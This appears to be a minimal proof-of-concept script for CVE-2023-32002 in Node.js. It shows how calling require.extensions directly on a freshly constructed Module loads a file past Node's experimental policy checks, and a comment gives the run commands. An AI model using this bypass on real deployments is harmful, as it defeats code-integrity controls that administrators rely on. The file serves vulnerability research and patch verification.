/* 

CVE-2023-32002
nvm use 20.0.0
node --experimental-policy=policy.json poc_2.js

*/

m = new require.main.constructor();
require.extensions[".js"](m, "./safe.js")
//require("./safe.js")